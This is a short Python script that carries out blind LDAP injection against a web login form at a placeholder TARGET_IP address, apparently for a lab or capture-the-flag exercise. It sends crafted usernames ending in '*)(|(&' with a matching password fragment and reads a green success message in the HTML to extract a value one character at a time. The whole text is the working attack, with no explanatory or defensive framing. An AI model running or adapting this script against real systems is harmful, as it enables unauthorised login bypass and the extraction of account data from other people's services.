import requests
from bs4 import BeautifulSoup
import string

url = 'http://TARGET_IP:TARGET_PORT'

char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

successful_response = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response:
    successful_response = False

    for char in char_set:
        
        # adjust payload
        payload = {'username': f'{successful_chars}{char}*)(|(&', 'password': 'pwd)'}

        # send POST request
        response = requests.post(url, data=payload, headers=headers)

        # parse HTML
        soup = BeautifulSoup(response.content, 'html.parser')

        # adjust success criteria as needed
        # in this scenario, successful responses contains a green style color
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break
    
    if not successful_response:
        print("No successful characters found this iteration.")

print(f"Final payload: {successful_chars}")